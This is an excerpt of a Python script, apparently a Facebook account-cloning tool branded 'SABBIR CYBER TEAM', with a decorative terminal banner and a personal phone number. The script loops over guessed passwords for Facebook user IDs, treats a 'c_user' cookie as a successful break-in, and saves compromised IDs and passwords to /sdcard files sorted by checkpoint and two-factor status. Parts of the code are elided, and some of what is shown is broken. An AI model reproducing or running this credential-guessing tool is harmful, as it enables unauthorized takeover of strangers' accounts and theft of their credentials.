...
\033[1;37m╔════════════════════════════════════════════╗
\033[1;31m│\033[1;32m☞  \033[1;32m 𝐀𝐔𝐓𝐇𝐎𝐑         𝑺𝑨𝑩𝑩𝑰𝑹  𝑯𝑶𝑺𝑺𝑬𝑵  
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊    𝑺𝑨𝑩𝑩𝑰𝑹 𝑯𝑶𝑺𝑺𝑬𝑵     
\033[1;31m│\033[1;32m☞  \033[1;32m𝑮𝑹𝑶𝑷                 𝑴𝑨𝑺𝑻𝑬𝑹 𝑴𝑰𝑵𝑫 
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏     𝟎𝟏𝟕𝟔𝟑𝟏𝟖𝟓𝟒𝟐𝟐            
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍     --- 4          
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄       𝑴𝑨𝑺𝑻𝑬𝑹 𝑴𝑰𝑵𝑫  
\033[1;37m╚🅑︎🅗︎🅣︎FACEBOOK TRICKS AND HELPING ZONE [𝑺𝑨𝑩𝑩𝑰𝑹]\033[1;37m🅑︎🅗︎🅣︎╝
\033[31;44m EVERYONE THINKS OF 𝑺𝑨𝑩𝑩𝑰𝑹 CYBER CHANGING THE WORLD     
 BUT NO ONE THINKS OF 𝑺𝑨𝑩𝑩𝑰𝑹 CYBER CHANGING HIMSELF.. 🍂\033[0;m
\033[1;91m=========================================================="""
...
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97m𝑺𝑨𝑩𝑩𝑰𝑹-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97m𝑺𝑨𝑩𝑩𝑰𝑹-CP.txt' %
              (H, P, str(len(cp))))
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : 𝑺𝑨𝑩𝑩𝑰𝑹 CYBER")
    print("\t  Fb page  : CYBER 99 TEAM")
    print("\t  Github   : 𝑺𝑨𝑩𝑩𝑰𝑹 CYBER 99-TEAM")
    print(c, 45*"-")
    print(47*"-")
    try:
        ...
        print("\t Welcome To 𝑺𝑨𝑩𝑩𝑰𝑹-CYBER-TEAM Tool ....")
        time.sleep(2)
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_𝑺𝑨𝑩𝑩𝑰𝑹-CYBER-TEAM_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/ROOT.OFF.𝑺𝑨𝑩𝑩𝑰𝑹");xyz()
    elif hamii in ["4","04"]:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio 𝑺𝑨𝑩𝑩𝑰𝑹_OK.mp3")
                print('\r\033[1;32m[𝑺𝑨𝑩𝑩𝑰𝑹-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/𝑺𝑨𝑩𝑩𝑰𝑹-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio 𝑺𝑨𝑩𝑩𝑰𝑹_2F.mp3")
                    print('\r\033[1;34m[𝑺𝑨𝑩𝑩𝑰𝑹-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/𝑺𝑨𝑩𝑩𝑰𝑹-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio 𝑺𝑨𝑩𝑩𝑰𝑹_CP.mp3")
                    print(f'\r\033[1;30m[𝑺𝑨𝑩𝑩𝑰𝑹-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/𝑺𝑨𝑩𝑩𝑰𝑹-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝑺𝑨𝑩𝑩𝑰𝑹-CYBER-TEAM🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
